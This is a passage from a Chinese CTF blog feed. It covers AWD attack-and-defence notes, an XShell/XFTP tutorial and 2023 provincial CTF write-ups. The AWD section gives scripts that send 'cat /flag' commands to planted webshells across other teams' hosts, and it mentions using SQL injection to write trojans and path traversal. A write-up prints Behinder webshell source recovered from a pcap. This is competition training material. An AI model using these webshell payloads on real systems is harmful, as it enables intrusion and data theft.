class="hljs-keyword">try</span>:<br>  res=request.post(url1, payload, timeout=<span class="hljs-number">2</span>)<br>  <span class="hljs-keyword">if</span> res.status_code == request.codes.ok:<br>   <span class="hljs-built_in">print</span> url1+<span class="hljs-string">&quot; connect shell success, flag is &quot;</span>+res.text<br>   <span class="hljs-built_in">print</span> &gt;&gt; f1, url1+<span class="hljs-string">&quot; connect shell success, flag is &quot;</span>+res.text<br>   <span class="hljs-built_in">print</span> &gt;&gt; f, url1+<span class="hljs-string">&quot;, &quot;</span>+passwd<br>  <span class="hljs-keyword">else</span>:<br>   <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;shell not find.&quot;</span><br> <span class="hljs-keyword">except</span>:<br>  <span class="hljs-built_in">print</span> url1+<span class="hljs-string">&quot; connect shell fail&quot;</span><br><br>f.close()<br>f1.close()<br><br></code></pre></td></tr></table></figure><p>配置其他队伍地址、shell路径和密码，就可以进行攻击，flag记录在 flag_list.txt文件中。</p><h6 id="命令行简单查找后门"><a href="#命令行简单查找后门" class="headerlink" title="命令行简单查找后门"></a>命令行简单查找后门</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name ‘*.php’ | xargs grep -n ‘<span class="hljs-built_in">eval</span>’<br>find / -name ‘*.php’ | xargs grep -n ‘system’<br>find / -name ‘*.php’ | xargs grep -n ‘assert’<br></code></pre></td></tr></table></figure><h6 id="存在某些队伍靶机检测没有做到位，导致遗留后门，利用python脚本检测并加以利用"><a href="#存在某些队伍靶机检测没有做到位，导致遗留后门，利用python脚本检测并加以利用" class="headerlink" title="存在某些队伍靶机检测没有做到位，导致遗留后门，利用python脚本检测并加以利用"></a>存在某些队伍靶机检测没有做到位，导致遗留后门，利用python脚本检测并加以利用</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>part_url=<span class="hljs-string">&#x27;/shell.php?pass=system(%27cat /flag%27);&#x27;</span><br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">149</span>,<span class="hljs-number">151</span>):<br>    <span class="hljs-keyword">try</span>:<br>      ip1=<span class="hljs-string">&#x27;192.168.75.&#x27;</span>+<span class="hljs-built_in">str</span>(s)<br>      ip=<span class="hljs-string">&#x27;http://&#x27;</span>+ip1+part_url<br>      <span class="hljs-built_in">print</span>(ip)<br>      res=requests.get(url=ip,timeout=<span class="hljs-number">0.1</span>)<br>      <span class="hljs-keyword">if</span> res.status_code!=<span class="hljs-number">404</span>:<br>        <span class="hljs-built_in">print</span>(ip1)<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>          f.write(ip1+<span class="hljs-string">&#x27;   &#x27;</span>+res.text)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>      <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p>脚本执行成功后会在当前目录下生成一个flag.txt存储flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python3 flag.py<br></code></pre></td></tr></table></figure><p>或者使用bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /flag<br>bash shell.sh<br><span class="hljs-comment">#shell.sh内容</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> `<span class="hljs-built_in">seq</span> 148 152`;<br><span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span>  <span class="hljs-string">&#x27;192.168.75.$i&#x27;</span>;<br>curl <span class="hljs-string">&quot;http://192.168.75.<span class="hljs-variable">$i</span>/shell.php&quot;</span> -d <span class="hljs-string">&quot;pass=system(&#x27;cat /flag&#x27;);&quot;</span>;<br><span class="hljs-keyword">done</span>;<br></code></pre></td></tr></table></figure><p>命令行单独查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://192.168.75.<span class="hljs-variable">$i</span>/shell.php&quot;</span> -d <span class="hljs-string">&quot;pass=system(&#x27;cat /flag&#x27;);&quot;</span>;<br></code></pre></td></tr></table></figure><h3 id="防不死马"><a href="#防不死马" class="headerlink" title="防不死马"></a>防不死马</h3><h4 id="使用条件竞争写入同名文件进行克制不死马"><a href="#使用条件竞争写入同名文件进行克制不死马" class="headerlink" title="使用条件竞争写入同名文件进行克制不死马"></a>使用条件竞争写入同名文件进行克制不死马</h4><p>对于不死马，直接删除脚本是没有用的，因为php执行的时候已经把脚本读进去解释成opcode运行了<br>关于opcode有：<a href="https://www.laruence.com/2008/06/18/221.html">https://www.laruence.com/2008/06/18/221.html</a><br>这里使用条件竞争写入同名文件进行克制不死马<br>可以看到现在.config.php文件内容仍为：</p><p><img src="/2023/11/17/AWD%E6%80%BB%E7%BB%93/1700236033998.png" alt="1700236033998"></p><p>我们上传一个test.php的php文件，注意usleep需要比不死马小，$code修改为无害内容</p><p><img src="/2023/11/17/AWD%E6%80%BB%E7%BB%93/1700236055894.png" alt="1700236055894"></p><p>上传至服务器访问<br>再次查看.config.php文件内容，可以看到内容已无害</p><p><img src="/2023/11/17/AWD%E6%80%BB%E7%BB%93/1700236101094.png" alt="1700236101094"></p><h3 id="监测攻击payload"><a href="#监测攻击payload" class="headerlink" title="监测攻击payload"></a>监测攻击payload</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">tail</span> -f *.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure><p>，看日志，不言而喻，抓他们的payload并利用</p><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>常见的漏洞包括SQL注入、文件包含、文件上传、命令执行等。</p><h4 id="（1）sql注入漏洞"><a href="#（1）sql注入漏洞" class="headerlink" title="（1）sql注入漏洞"></a>（1）sql注入漏洞</h4><p>比赛一般没有防护（除非选手安装了防御脚本），可直接通过 <code>--sql-shell</code> 执行 <code>select load_file(‘/flag’);</code> 得到flag，也可以利用 <code>into outfile</code> 写木马维持权限。</p><h4 id="（2）本地文件包含或目录遍历"><a href="#（2）本地文件包含或目录遍历" class="headerlink" title="（2）本地文件包含或目录遍历"></a>（2）本地文件包含或目录遍历</h4><p>直接通过 <code>../../../../../flag</code> 获取。</p>]]></content>
    
    
    
    <tags>
      
      <tag>AWD</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XShell+XFTP的使用</title>
    <link href="/2023/11/17/XShell+XFTP%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2023/11/17/XShell+XFTP%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="XShell"><a href="#XShell" class="headerlink" title="XShell"></a>XShell</h1><p>个人许可证，点击关闭即可</p><h2 id="使用XShell连接Linux服务器"><a href="#使用XShell连接Linux服务器" class="headerlink" title="使用XShell连接Linux服务器"></a>使用XShell连接Linux服务器</h2><h6 id="1-XShell初始化界面"><a href="#1-XShell初始化界面" class="headerlink" title="1.XShell初始化界面"></a>1.XShell初始化界面</h6><h6 id="2-点击“新建”，新建会话"><a href="#2-点击“新建”，新建会话" class="headerlink" title="2.点击“新建”，新建会话"></a>2.点击“新建”，新建会话</h6><p><img src="/2023/11/17/XShell+XFTP%E7%9A%84%E4%BD%BF%E7%94%A8/image-20231117220535606.png" alt="image-20231117220535606"></p><h6 id="3-填写会话信息"><a href="#3-填写会话信息" class="headerlink" title="3.填写会话信息"></a>3.填写会话信息</h6><ol><li><ol><li>填写一个便于标识的名称</li></ol></li><li><ol start="2"><li>填写服务器的公网IP</li></ol></li><li><ol start="3"><li><p>点击用户身份验证</p><p><img src="/2023/11/17/XShell+XFTP%E7%9A%84%E4%BD%BF%E7%94%A8/1700229985965.png" alt="1700229985965"></p></li></ol></li></ol><h6 id="4-填写服务器的用户名和密码，之后点击“确定”"><a href="#4-填写服务器的用户名和密码，之后点击“确定”" class="headerlink" title="4.填写服务器的用户名和密码，之后点击“确定”"></a>4.填写服务器的用户名和密码，之后点击“确定”</h6><p><img src="/2023/11/17/XShell+XFTP%E7%9A%84%E4%BD%BF%E7%94%A8/1700230060731.png" alt="1700230060731"></p><h6 id="5-选中会话，点击“连接”"><a href="#5-选中会话，点击“连接”" class="headerlink" title="5.选中会话，点击“连接”"></a>5.选中会话，点击“连接”</h6><p><img src="/2023/11/17/XShell+XFTP%E7%9A%84%E4%BD%BF%E7%94%A8/1700230076690.png" alt="1700230076690"></p><h6 id="6-此时已经成功的的连接上了服务器，可以进行正常的命令操作"><a href="#6-此时已经成功的的连接上了服务器，可以进行正常的命令操作" class="headerlink" title="6.此时已经成功的的连接上了服务器，可以进行正常的命令操作"></a>6.此时已经成功的的连接上了服务器，可以进行正常的命令操作</h6><h1 id="XFTP"><a href="#XFTP" class="headerlink" title="XFTP"></a>XFTP</h1><p>Xftp的作用就是给虚拟机传点文件、资料······</p><p><img src="/2023/11/17/XShell+XFTP%E7%9A%84%E4%BD%BF%E7%94%A8/image-20231117221427870.png" alt="image-20231117221427870"></p><p><img src="/2023/11/17/XShell+XFTP%E7%9A%84%E4%BD%BF%E7%94%A8/1700230478461.png" alt="1700230478461"></p><p><img src="/2023/11/17/XShell+XFTP%E7%9A%84%E4%BD%BF%E7%94%A8/image-20231117221453797.png" alt="image-20231117221453797"></p><p><img src="/2023/11/17/XShell+XFTP%E7%9A%84%E4%BD%BF%E7%94%A8/image-20231117221515803.png" alt="image-20231117221515803"></p><p><img src="/2023/11/17/XShell+XFTP%E7%9A%84%E4%BD%BF%E7%94%A8/image-20231117221527061.png" alt="image-20231117221527061"></p>]]></content>
    
    
    
    <tags>
      
      <tag>AWD</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/11/15/hello-world/"/>
    <url>/2023/11/15/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2023省赛wp</title>
    <link href="/2023/11/11/%E7%9C%81%E8%B5%9Bwp/"/>
    <url>/2023/11/11/%E7%9C%81%E8%B5%9Bwp/</url>
    
    <content type="html"><![CDATA[<h1 id="初赛"><a href="#初赛" class="headerlink" title="初赛"></a>初赛</h1><h3 id="number-game"><a href="#number-game" class="headerlink" title="number game"></a>number game</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">_0x41b2</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> _0x581373 = [<span class="hljs-string">&#x27;random&#x27;</span>, <span class="hljs-string">&#x27;110weBJzg&#x27;</span>, <span class="hljs-string">&#x27;72Hfusyf&#x27;</span>, <span class="hljs-string">&#x27;3399gncQtP&#x27;</span>, <span class="hljs-string">&#x27;fromCharCode&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;57148oCRiuH&#x27;</span>, <span class="hljs-string">&#x27;innerHTML&#x27;</span>, <span class="hljs-string">&#x27;565DHmrSB&#x27;</span>, <span class="hljs-string">&#x27;2543450CSzJEO&#x27;</span>, <span class="hljs-string">&#x27;295299TseKck&#x27;</span>, <span class="hljs-string">&#x27;40794iCQePa&#x27;</span>, <span class="hljs-string">&#x27;3062gGLIpQ&#x27;</span>, <span class="hljs-string">&#x27;9huxpnh&#x27;</span>, <span class="hljs-string">&#x27;30409884zfOaIf&#x27;</span>, <span class="hljs-string">&#x27;toString&#x27;</span>, <span class="hljs-string">&#x27;15660bKtcCP&#x27;</span>];<br>    _0x41b2 = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> _0x581373;<br>    &#125;<br>    ;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">_0x41b2</span>();<br>&#125;<br>(<span class="hljs-keyword">function</span>(<span class="hljs-params">_0x6b2864, _0x325f4f</span>) &#123;<br>    <span class="hljs-keyword">var</span> _0x19c61a = _0x359f<br>      , _0x596e22 = <span class="hljs-title function_">_0x6b2864</span>();<br>    <span class="hljs-keyword">while</span> (!![]) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">var</span> _0x410e5a = <span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x19c61a</span>(<span class="hljs-number">0xd0</span>)) / <span class="hljs-number">0x1</span> * (-<span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x19c61a</span>(<span class="hljs-number">0xd6</span>)) / <span class="hljs-number">0x2</span>) + -<span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x19c61a</span>(<span class="hljs-number">0xd1</span>)) / <span class="hljs-number">0x3</span> * (-<span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x19c61a</span>(<span class="hljs-number">0xdb</span>)) / <span class="hljs-number">0x4</span>) + <span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x19c61a</span>(<span class="hljs-number">0xdd</span>)) / <span class="hljs-number">0x5</span> * (-<span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x19c61a</span>(<span class="hljs-number">0xcf</span>)) / <span class="hljs-number">0x6</span>) + -<span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x19c61a</span>(<span class="hljs-number">0xde</span>)) / <span class="hljs-number">0x7</span> + -<span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x19c61a</span>(<span class="hljs-number">0xd7</span>)) / <span class="hljs-number">0x8</span> * (<span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x19c61a</span>(<span class="hljs-number">0xdf</span>)) / <span class="hljs-number">0x9</span>) + -<span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x19c61a</span>(<span class="hljs-number">0xd4</span>)) / <span class="hljs-number">0xa</span> * (<span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x19c61a</span>(<span class="hljs-number">0xd8</span>)) / <span class="hljs-number">0xb</span>) + <span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x19c61a</span>(<span class="hljs-number">0xd2</span>)) / <span class="hljs-number">0xc</span>;<br>            <span class="hljs-keyword">if</span> (_0x410e5a === _0x325f4f)<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">else</span><br>                _0x596e22[<span class="hljs-string">&#x27;push&#x27;</span>](_0x596e22[<span class="hljs-string">&#x27;shift&#x27;</span>]());<br>        &#125; <span class="hljs-keyword">catch</span> (_0x1b9b94) &#123;<br>            _0x596e22[<span class="hljs-string">&#x27;push&#x27;</span>](_0x596e22[<span class="hljs-string">&#x27;shift&#x27;</span>]());<br>        &#125;<br>    &#125;<br>&#125;(_0x41b2, <span class="hljs-number">0x79872</span>));<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">_0x359f</span>(<span class="hljs-params">_0xa22008, _0x233420</span>) &#123;<br>    <span class="hljs-keyword">var</span> _0x41b233 = <span class="hljs-title function_">_0x41b2</span>();<br>    <span class="hljs-keyword">return</span> _0x359f = <span class="hljs-keyword">function</span>(<span class="hljs-params">_0x359fd1, _0xe2d6d7</span>) &#123;<br>        _0x359fd1 = _0x359fd1 - <span class="hljs-number">0xcf</span>;<br>        <span class="hljs-keyword">var</span> _0x308121 = _0x41b233[_0x359fd1];<br>        <span class="hljs-keyword">return</span> _0x308121;<br>    &#125;<br>    ,<br>    <span class="hljs-title function_">_0x359f</span>(_0xa22008, _0x233420);<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">roll</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> _0x38f496 = _0x359f<br>      , _0x1afb7a = <span class="hljs-title class_">Math</span>[<span class="hljs-title function_">_0x38f496</span>(<span class="hljs-number">0xda</span>)](<span class="hljs-title class_">Math</span>[<span class="hljs-title function_">_0x38f496</span>(<span class="hljs-number">0xd5</span>)]() * <span class="hljs-number">0x3e8</span>);<br>    <span class="hljs-variable language_">document</span>[<span class="hljs-string">&#x27;getElementById&#x27;</span>](<span class="hljs-string">&#x27;number&#x27;</span>)[<span class="hljs-title function_">_0x38f496</span>(<span class="hljs-number">0xdc</span>)] = _0x1afb7a[<span class="hljs-title function_">_0x38f496</span>(<span class="hljs-number">0xd3</span>)]();<br>    <span class="hljs-keyword">if</span> (_0x1afb7a == <span class="hljs-number">0x539</span>) &#123;<br>        <span class="hljs-keyword">var</span> _0x14184c = [<span class="hljs-number">0x38</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0xb</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xa</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xb</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x1a</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x5a</span>]<br>          , _0x477866 = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> _0x6698b7 = <span class="hljs-number">0x0</span>; _0x6698b7 &lt; _0x14184c[<span class="hljs-string">&#x27;length&#x27;</span>]; _0x6698b7++)<br>            _0x477866 += <span class="hljs-title class_">String</span>[<span class="hljs-title function_">_0x38f496</span>(<span class="hljs-number">0xd9</span>)](_0x14184c[_0x6698b7] ^ _0x6698b7 + <span class="hljs-number">0x5a</span>);<br>        <span class="hljs-title function_">alert</span>(_0x477866);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>看到roll（）中<code>_0x1afb7a == 0x539</code>才能执行后续的alert</p><p>直接修改源代码</p><p><code>_0x1afb7a != 0x539</code></p><p>得到flag</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">b<span class="hljs-number">4</span>By_<span class="hljs-name">m1</span>$c_@<span class="hljs-symbol">n3</span>_b<span class="hljs-number">4</span>By_f<span class="hljs-number">3</span>O<span class="hljs-symbol">n7</span>e<span class="hljs-symbol">Nd_731</span>cK!<br></code></pre></td></tr></table></figure><h3 id="Ez-misc"><a href="#Ez-misc" class="headerlink" title="Ez_misc"></a>Ez_misc</h3><p>不知道文件格式</p><p>010查看</p><p>发现开头ffd8变成了ff8d，观察所有，发现每一位的两个字母都换了</p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;yuanshen&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    hex_list = (<span class="hljs-string">&quot;&#123;:02X&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(c)) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> f.read())   <span class="hljs-comment"># 定义变量接受文件内容</span><br>    buflist = <span class="hljs-built_in">list</span>(hex_list)  <span class="hljs-comment"># 用列表保存信息，方便后续操作</span><br>    a=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">666294</span>):<br>        buflist[i]=buflist[i][::-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">666294</span>):<br>        a = a+buflist[i]<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;out.txt&quot;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<span class="hljs-keyword">as</span> f1:<br>    f1.write(a)<br></code></pre></td></tr></table></figure><p>out.txt里面的内容复制到cyberchef</p><p>识别到jpg并导出</p><p>kali中</p><p>steghide info filename</p><p>有文件flag.txt</p><p>steghide extract -sf filename</p><p>得到flag.txt</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attributespan><br></code></pre></td></tr></table></figure><p>dot一眼是.      那么猜测DASH是-</p><p>替换得到</p><p>解密得到flag{df4f635ab342a5b3bb855a464d7bb4ec}</p><h1 id="决赛"><a href="#决赛" class="headerlink" title="决赛"></a>决赛</h1><h3 id="Xcode-v5-8"><a href="#Xcode-v5-8" class="headerlink" title="Xcode v5.8"></a>Xcode v5.8</h3><p>给了flag.txt</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">hAXBCEaBZMLZNJbRAQnNlOZdARqFAB1QpKa7IF4F5R1ElBKErIKpFQZNcNEc+<br></code></pre></td></tr></table></figure><p>根据题目Xcode V5.8，解xxencode ，得到：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-number">23</span><span class="hljs-symbol">NBceayYVwLs6</span>qjZLwdL<span class="hljs-number">475</span>ZbTDdGt<span class="hljs-number">415</span>d<span class="hljs-number">7</span>QmQrVhe<br></code></pre></td></tr></table></figure><p>然后base58</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">DASCTF&#123;The_new_encode_master!!&#125;<br></code></pre></td></tr></table></figure><h3 id="Ez-Signin"><a href="#Ez-Signin" class="headerlink" title="Ez_Signin"></a>Ez_Signin</h3><p>给了一个加密的压缩包</p><p>010打开发现报错</p><p>最后面附加了一串base64，解密内容What_iS_tHis_275626d657e6f556679666，发现是假的flag</p><p>爆破压缩包，密码是11452</p><p>base32解得一个鼠标键盘流量</p><p>只保留坐标，将坐标之间的<code>,</code>删去,例如这样<code>495 313</code></p><p>gnuplot绘图</p><p>得到flag</p><p>需要镜像翻转</p><p><img src="/2023/11/11/%E7%9C%81%E8%B5%9Bwp/image-20231111214403753.png" alt="image-20231111214403753"></p><p>flag{8f16a9717824aa456eb9a98653eb3993}</p><p>比赛一直以为是W难受(</p><h3 id="NewGrating"><a href="#NewGrating" class="headerlink" title="NewGrating"></a>NewGrating</h3><p>解压得到蝎.pcapng，猜测冰蝎</p><p>查看流量包翻到upload_file.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php">------WebKitFormBoundary906dOBUcjOE26LmB<br>Content-Disposition: form-data; name=<span class="hljs-string">&quot;file&quot;</span>; filename=<span class="hljs-string">&quot;shell.php&quot;</span><br>Content-Type: application/octet-stream<br><br><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br>    <span class="hljs-comment">// $key=&quot;e45e329feb5d925b&quot;; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span><br>    <span class="hljs-variable">$key</span>=<span class="hljs-string">&quot;e46023a69f8db309&quot;</span>; <span class="hljs-comment">//DASCTF</span><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>]=<span class="hljs-variable">$key</span>;<br><span class="hljs-title function_ invoke__">session_write_close</span>();<br><span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">&#x27;openssl&#x27;</span>))<br>&#123;<br><span class="hljs-variable">$t</span>=<span class="hljs-string">&quot;base64_&quot;</span>.<span class="hljs-string">&quot;decode&quot;</span>;<br><span class="hljs-variable">$post</span>=<span class="hljs-variable">$t</span>(<span class="hljs-variable">$post</span>.<span class="hljs-string">&quot;&quot;</span>);<br><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span 